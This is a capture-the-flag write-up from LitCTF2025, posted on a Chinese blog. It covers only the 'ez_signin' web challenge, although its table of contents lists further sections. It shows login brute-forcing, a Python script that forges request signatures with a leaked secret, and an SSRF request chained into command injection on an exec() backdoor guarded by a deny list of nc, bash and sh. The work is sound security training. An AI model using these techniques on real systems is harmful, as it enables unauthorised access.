@@ -1,0 +1,809 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    LitCTF2025-WriteUp |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Web  ez_signin(爆破时间戳)  一进去是403 扫目录扫出来&#x2F;login.html，访问  一个文档管理系统 先来爆破一下这个登录系统 抓包，爆破username和password 爆破出来用户名和密码为admin&#x2F;admin123 但当登录的时候显示签名错误 来看JS源代码 12345678910111213141516171819202122232425262728293031">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF2025-WriteUp">
+<meta property="og:url" content="http://example.com/2025/05/26/LitCTF2025-WriteUp/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Web  ez_signin(爆破时间戳)  一进去是403 扫目录扫出来&#x2F;login.html，访问  一个文档管理系统 先来爆破一下这个登录系统 抓包，爆破username和password 爆破出来用户名和密码为admin&#x2F;admin123 但当登录的时候显示签名错误 来看JS源代码 12345678910111213141516171819202122232425262728293031">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250526142007399.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250526142152871.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/0250527160238492.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527160404128.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527144040972.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527153135735.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527170322274.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527170338861.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527170613304.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527171539298.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527171555075.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527171608627.png">
+<meta property="og:image" content="http://example.com/2025/05/26/images/20250527171626049.png">
+<meta property="article:published_time" content="2025-05-26T06:17:19.000Z">
+<meta property="article:modified_time" content="2025-10-03T07:07:41.313Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="php反序列化">
+<meta property="article:tag" content="时间戳爆破">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/26/images/20250526142007399.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="LitCTF2025-WriteUp">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">LitCTF2025-WriteUp</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_signin%E7%88%86%E7%A0%B4%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">1.1.</span> <span class="toc-text"> ez_signin(爆破时间戳)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AFwp"><span class="toc-number">1.2.</span> <span class="toc-text"> 君の名はwp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0pop%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 构造pop链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87preg_matchoadi-litctf2025"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 绕过preg_match(&quot;&#x2F;^[Oa]:[\d]+&#x2F;i&quot;, $Litctf2025)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 完整EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 非预期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">2.1.</span> <span class="toc-text"> math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby"><span class="toc-number">2.2.</span> <span class="toc-text"> baby</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-LitCTF2025-WriteUp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/26/LitCTF2025-WriteUp/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-26T06:17:19.000Z" itemprop="datePublished">2025-05-26</time>
+    <time style="display: none;" id="post-update-time">2025-10-03</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="ez_signin爆破时间戳"><a class="markdownIt-Anchor" href="#ez_signin爆破时间戳"></a> ez_signin(爆破时间戳)</h3>
+<p><img src="../images/20250526142007399.png" alt="image-20250526142007399" /></p>
+<p>一进去是403</p>
+<p>扫目录扫出来<code>/login.html</code>，访问</p>
+<p><img src="../images/20250526142152871.png" alt="image-20250526142152871" /></p>
+<p>一个文档管理系统</p>
+<p>先来爆破一下这个登录系统</p>
+<p>抓包，爆破username和password</p>
+<p>爆破出来用户名和密码为<strong>admin/admin123</strong></p>
+<p>但当登录的时候显示签名错误</p>
+<p>来看JS源代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">const</span> loginBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;loginBtn&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> passwordInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> errorTip = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;errorTip&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> rawUsername = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line">        loginBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> rawPassword = passwordInput.<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line">            <span class="keyword">if</span> (!rawPassword) &#123;</span><br><span class="line">                errorTip.<span class="property">textContent</span> = <span class="string">&#x27;请输入密码&#x27;</span>;</span><br><span class="line">                errorTip.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line">                passwordInput.<span class="title function_">focus</span>();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> md5Username = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(rawUsername).<span class="title function_">toString</span>();   </span><br><span class="line">            <span class="keyword">const</span> md5Password = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(rawPassword).<span class="title function_">toString</span>();   </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">            <span class="keyword">const</span> shortMd5User = md5Username.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">6</span>);  </span><br><span class="line">            <span class="keyword">const</span> shortMd5Pass = md5Password.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">6</span>);  </span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">            <span class="keyword">const</span> timestamp = <span class="title class_">Date</span>.<span class="title function_">now</span>().<span class="title function_">toString</span>(); <span class="comment">//五分钟</span></span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">            <span class="keyword">const</span> secretKey = <span class="string">&#x27;easy_signin&#x27;</span>;  </span><br><span class="line">            <span class="keyword">const</span> sign = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;login.php&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;X-Sign&#x27;</span>: sign  </span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">                        <span class="attr">username</span>: md5Username,   </span><br><span class="line">                        <span class="attr">password</span>: md5Password,   </span><br><span class="line">                        <span class="attr">timestamp</span>: timestamp</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (result.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;登录成功！&#x27;</span>);</span><br><span class="line">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;dashboard.php&#x27;</span>; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorTip.<span class="property">textContent</span> = result.<span class="property">msg</span>;</span><br><span class="line">                    errorTip.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line">                    passwordInput.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    passwordInput.<span class="title function_">focus</span>();</span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> errorTip.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;show&#x27;</span>), <span class="number">3000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                errorTip.<span class="property">textContent</span> = <span class="string">&#x27;网络请求失败&#x27;</span>;</span><br><span class="line">                errorTip.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> errorTip.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;show&#x27;</span>), <span class="number">3000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        passwordInput.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            errorTip.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里是用<strong>md5(用户名)+md5(密码)+时间戳+secret_key</strong>作为签名，放在请求头来验证</p>
+<p>这里的<strong>secret_key = “easy_signin”</strong></p>
+<p>所以现在只需要爆破时间戳就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址</span></span><br><span class="line">url = <span class="string">&quot;http://node6.anna.nssctf.cn:21669/login.php&quot;</span>  <span class="comment"># ← 改成你的实际地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定信息</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;admin123&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;easy_signin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前时间戳（单位：毫秒）</span></span><br><span class="line">timestamp = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密处理</span></span><br><span class="line">md5_username = hashlib.md5(username.encode()).hexdigest()</span><br><span class="line">md5_password = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">short_md5_user = md5_username[:<span class="number">6</span>]</span><br><span class="line">short_md5_pass = md5_password[:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key</span><br><span class="line">sign = hashlib.md5(sign_raw.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造请求头和数据</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;X-Sign&quot;</span>: sign</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: md5_username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: md5_password,</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: timestamp</span><br><span class="line">&#125;</span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8088&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 发起请求</span></span><br><span class="line">response = requests.post(url, headers=headers, data=data,proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[响应状态码]:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[响应内容]:&quot;</span>, response.text)</span><br><span class="line">    <span class="built_in">print</span>(timestamp)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[错误]:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> response.headers.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>抓包该脚本</p>
+<p><img src="../images/0250527160238492.png" alt="image-20250527160238492" /></p>
+<p>在浏览器改该脚本得到的cookie</p>
+<p>再访问题目给的目录<strong>dashboard.php</strong></p>
+<p><img src="../images/20250527160404128.png" alt="image-20250527160404128" /></p>
+<p>成功,访问/backup/8e0132966053d4bf8b2dbe4ede25502b.php</p>
+<p>但这里显示没权限访问</p>
+<p>注意到有 api.js。访问得到一个 api 路由：/api/sys/urlcode.php?url=</p>
+<p>访问<code>/api/sys/urlcode.php?url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php</code></p>
+<p>得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;waf&quot;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\b(nc|bash|sh)\b/i&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf!!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/more|less|head|sort/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tail|sed|cut|awk|strings|od|ping/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$name</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;执行结果：\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n返回码：<span class="subst">$return_var</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;非本地用户&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意到必须是本地请求。那么就靠 api 接口打 SSRF</p>
+<p>尝试<code>/api/sys/urlcode.php?url=http://127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=ls%2520../</code></p>
+<p>有</p>
+<p><img src="../images/20250527144040972.png" alt="image-20250527144040972" /></p>
+<p>直接访问 /327a6c4304ad5938eaf0efb6cc3e53dc.php 得到 flag</p>
